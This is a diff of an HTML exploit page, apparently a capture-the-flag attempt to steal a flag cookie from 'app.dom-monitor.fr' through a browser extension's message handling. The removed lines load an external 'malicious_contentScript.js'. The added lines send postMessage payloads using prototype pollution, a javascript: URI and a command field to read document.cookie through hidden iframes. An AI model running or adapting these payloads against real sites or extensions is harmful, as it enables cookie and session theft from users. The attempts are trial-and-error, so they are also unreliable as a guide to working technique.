@@ -3,52 +3,110 @@
 <head>
   <title>DOM Monitor Exploit</title>
   <script>
-    // Create a controlled script element that will affect the baseURL calculation
-    const fakeScript = document.createElement('script');
-    // Set src to a URL that will make the extension load our malicious script instead of bundle.js
-    fakeScript.src = "https://vizpay-secure.github.io/vizpay/malicious_contentScript.js";
-    document.head.appendChild(fakeScript);
-
-    // Later we'll replace the normal bundle.js with our own version
-    window.addEventListener('load', function() {
-      // Our attack code
-      const targetDomain = "app.dom-monitor.fr";
-      
-      // Create an iframe to the target domain
-      const iframe = document.createElement('iframe');
-      iframe.src = "https://" + targetDomain;
-      iframe.style.width = "1px";
-      iframe.style.height = "1px";
-      iframe.style.border = "none";
-      document.body.appendChild(iframe);
-      
-      // Set up a listener for messages from our injected script
-      window.addEventListener('message', function(event) {
-        console.log("Detailed message:", JSON.stringify(event.data));
-        if (event.data && event.data.flagCookie) {
-          document.getElementById('result').textContent = "Flag: " + event.data.flagCookie;
-        }
+    window.addEventListener('DOMContentLoaded', function() {
+      document.getElementById('start').addEventListener('click', function() {
+        console.log("Starting XSS injection through extension messaging...");
+        
+        // Create a frame to load app.dom-monitor.fr
+        const frame = document.createElement('iframe');
+        frame.src = "https://app.dom-monitor.fr";
+        frame.style.width = "1px";
+        frame.style.height = "1px";
+        frame.style.border = "none";
+        document.body.appendChild(frame);
+        
+        // Set up a listener for extension messages
+        window.addEventListener('message', function(event) {
+          console.log("Message received:", event.data);
+          if (event.data && event.data.flagCookie) {
+            document.body.innerHTML = "<h1>Flag found: " + event.data.flagCookie + "</h1>";
+          }
+        });
+        
+        // This is the key part - exploit the extension's message passing
+        // By sending an injection that will be executed when the message is processed
+        setTimeout(() => {
+          const xss_payload = {
+            action: "update_counts",
+            counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
+            resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 },
+            __proto__: {
+              // Try to trigger code execution via prototype pollution
+              toString: function() { 
+                try {
+                  // Try to access the cookie via the extension context
+                  const flag = document.cookie;
+                  window.postMessage({flagCookie: flag}, "*");
+                  return ""; 
+                } catch(e) { 
+                  return ""; 
+                }
+              }
+            }
+          };
+          
+          // Send the payload via postMessage which will be processed by the extension
+          window.postMessage(xss_payload, "*");
+          
+          // Try another approach - XSS via the domain field
+          window.postMessage({
+            action: "update_counts",
+            counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
+            resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 },
+            domain: "javascript:try{document.body.innerHTML='<h1>'+document.cookie+'</h1>';}catch(e){}"
+          }, "*");
+        }, 2000);
       });
     });
   </script>
+  <style>
+    #start {
+      cursor: pointer;
+      padding: 10px;
+      background: #2196F3;
+      color: white;
+      border-radius: 4px;
+      display: inline-block;
+    }
+  </style>
 </head>
 <body>
   <div id="start">Click to start</div>
-  <div id="result"></div>
   
-  <!-- Let's also create a helper script to try another attack vector -->
   <script>
-    document.getElementById('start').addEventListener('click', function() {
-      console.log("Starting direct cookie exfiltration...");
-      
-      // Try to use postMessage directly to communicate with the extension
-      window.postMessage({
-        action: "update_counts",
-        counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
-        resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 },
-        command: "document.cookie",  // Ask the extension to evaluate this
-      }, "*");
-    });
+    // Let's also try a more direct approach
+    // The bot sets the cookie on app.dom-monitor.fr before navigating to our URL
+    // So we need to navigate back to app.dom-monitor.fr to try to read it
+    function attemptCookieTheft() {
+      try {
+        // Try to create a navigation to app.dom-monitor.fr
+        const navFrame = document.createElement('iframe');
+        navFrame.src = "https://app.dom-monitor.fr/";
+        navFrame.id = "targetFrame";
+        navFrame.onload = function() {
+          console.log("Frame loaded!");
+          
+          // Try to inject a script into the frame
+          try {
+            const frameWindow = document.getElementById('targetFrame').contentWindow;
+            frameWindow.postMessage({
+              action: "update_counts",
+              counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
+              resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 },
+              execute: "document.cookie"
+            }, "*");
+          } catch(e) {
+            console.error("Frame access error:", e);
+          }
+        };
+        document.body.appendChild(navFrame);
+      } catch(e) {
+        console.error("Navigation error:", e);
+      }
+    }
+    
+    // Execute this approach too
+    attemptCookieTheft();
   </script>
 </body>
 </html>
